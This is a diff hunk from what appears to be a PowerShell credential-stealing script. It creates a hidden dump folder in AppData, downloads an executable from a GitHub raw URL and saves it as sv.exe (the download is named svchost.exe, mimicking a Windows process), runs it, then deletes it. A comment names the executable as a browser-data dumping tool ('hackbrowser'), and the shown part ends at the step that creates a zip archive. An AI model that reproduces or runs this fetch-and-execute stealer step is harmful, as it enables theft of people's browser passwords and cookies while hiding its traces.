@@ -8,7 +8,7 @@ mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/svchost.exe" -OutFile "$env:appdata\dump\sv.exe"
-./wn.exe
+./sv.exe
 Start-Sleep -Seconds 6
 Remove-Item -Path "$env:appdata\dump\sv.exe" -Force
 #Creating A Zip Archive
